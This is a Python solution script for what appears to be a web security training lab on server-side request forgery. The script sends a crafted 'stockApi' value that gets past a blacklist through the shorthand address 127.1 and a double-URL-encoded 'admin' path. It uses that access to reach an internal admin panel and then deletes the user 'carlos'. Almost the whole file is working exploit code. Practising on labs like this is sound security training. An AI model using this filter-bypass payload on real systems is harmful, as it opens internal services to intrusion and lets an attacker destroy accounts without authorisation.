import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

# server blacklists "127.0.0.1", "localhost", and "admin"
# bypass with: 127.1 (shorthand localhost) + double-URL-encode the 'a' in admin
# %2561 -> first decode -> %61 -> second decode -> 'a'
target = "http://127.1/%2561dmin"

lab.info("Accessing admin panel via blacklist bypass...")
resp = lab.post("/product/stock", data={"stockApi": target})

if resp.status_code == 200 and "carlos" in resp.text:
    lab.success("Got admin panel, deleting carlos...")
    lab.post("/product/stock", data={
        "stockApi": "http://127.1/%2561dmin/delete?username=carlos"
    })
else:
    lab.fail(f"Bypass failed (status {resp.status_code})")

lab.check_solved()
